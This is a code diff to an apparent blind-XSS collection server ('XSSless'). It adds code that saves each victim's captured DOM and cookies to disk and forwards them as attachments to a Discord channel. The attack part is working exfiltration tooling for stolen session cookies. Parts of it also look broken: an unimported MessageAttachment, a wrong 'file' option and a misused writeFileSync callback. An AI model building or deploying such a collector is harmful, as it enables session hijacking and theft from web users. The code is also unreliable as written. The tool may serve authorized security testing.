@@ -9,6 +9,8 @@ const process = require("process");
 var request = require("request");
 const path = require("path")
 const { Client, GatewayIntentBits } = require('discord.js');
+const fs = require('fs');
+const data_path = './data';
 
 // Support local development with .env
 require('dotenv').config()
@@ -52,6 +54,18 @@ app.use(function (req, res, next) {
   next();
 });
 
+function makeid(length) {
+  let result = '';
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  const charactersLength = characters.length;
+  let counter = 0;
+  while (counter < length) {
+    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    counter += 1;
+  }
+  return result;
+}
+
 const escapeSpecChars = (text) => {
   // Use {} and reverse markdown carefully.
   const parse = text.replace(/([\\\{\}_*\[\]()~`>\#\+\-=|\.!])/g, "\\$1");
@@ -62,8 +76,22 @@ const escapeSpecChars = (text) => {
 
 function generate_blind_xss_alert(body) {
   var alert = "**XSSless: Blind XSS Alert**\n";
+  const random_dir = makeid(7);
+  const output_dir = `${data_path}/${random_dir}`
+  if (!fs.existsSync(output_dir)) fs.mkdirSync(output_dir);
+
   for( let k of Object.keys(body)) {
     if (k === "Screenshot") {
+      continue
+    } else if (k === "DOM"){
+      fs.writeFileSync(`${output_dir}/dom.html`, body[k], function(err){
+        if(err) throw err
+      });
+      continue
+    } else if (k === "Cookies"){
+      fs.writeFileSync(`${output_dir}/cookies.txt`, body[k], function(err){
+        if(err) throw err
+      });
       continue
     }
 
@@ -74,7 +102,7 @@ function generate_blind_xss_alert(body) {
       alert += "*"+escapeSpecChars(k)+":* " + "```" + escapeSpecChars(body[k]) + "```" + "\n"
     }
   }
-  return(alert)
+  return [alert, output_dir]
 }
 
 
@@ -116,7 +144,7 @@ function send_to_slack(alert){
   });
 }
 
-function send_to_discord(messageContent) {
+function send_to_discord(messageContent, attachment_path = null) {
   messageContent = messageContent
   const channel = client.channels.cache.get(discord_channel_id);
 
@@ -124,12 +152,23 @@ function send_to_discord(messageContent) {
     channel.send(messageContent)
       .then(sentMessage => console.log(`Message sent!`))
       .catch(error => console.error(`Error sending message: ${error}`));
+
+
+    if (attachment_path){
+      const dom_attachment = new MessageAttachment(`${data_path}/${attachment_path}/dom.html`)
+      const cookie_attachment = new MessageAttachment(`${data_path}/${attachment_path}/cookies.txt`)
+      channel.send({
+        content: 'HTML',
+        file: [dom_attachment, cookie_attachment]
+      }).then(sentAttachment => console.log("Attachment sent!"))
+      .catch(error => console.error("Error sending message: " + error));
+    }
   } else {
     console.error(`Channel with ID ${discord_channel_id} not found.`);
   }
 }
 
-function send_notification(data){
+function send_notification(data, attachment_path = null){
   if(slack_notification){
     send_to_slack(data)
   }
@@ -139,7 +178,7 @@ function send_notification(data){
   }
   
   if(discord_notification){
-    send_to_discord(data)
+    send_to_discord(data, attachment_path)
   }
 }
 
@@ -221,9 +260,9 @@ app.post("/c", async (req, res) => {
 
     // Now handle the regular Slack alert
     data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
-    const alert = generate_blind_xss_alert(data)
+    const alert_generated = generate_blind_xss_alert(data)
 
-    send_notification(alert)
+    send_notification(alert_generated[0], alert_generated[1])
     res.send('ok\n');
 })
 
